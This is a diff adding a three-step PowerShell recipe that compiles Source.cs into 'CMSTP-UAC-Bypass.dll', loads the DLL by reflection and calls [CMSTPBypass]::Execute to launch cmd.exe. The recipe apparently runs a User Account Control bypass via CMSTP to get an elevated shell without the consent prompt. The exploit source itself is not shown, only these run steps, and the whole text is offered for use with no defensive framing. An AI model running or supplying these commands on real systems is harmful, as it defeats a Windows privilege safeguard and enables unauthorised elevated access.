@@ -1,0 +1,11 @@
+
+1.
+Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
+
+2. 
+
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
+
+3.
+
+[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
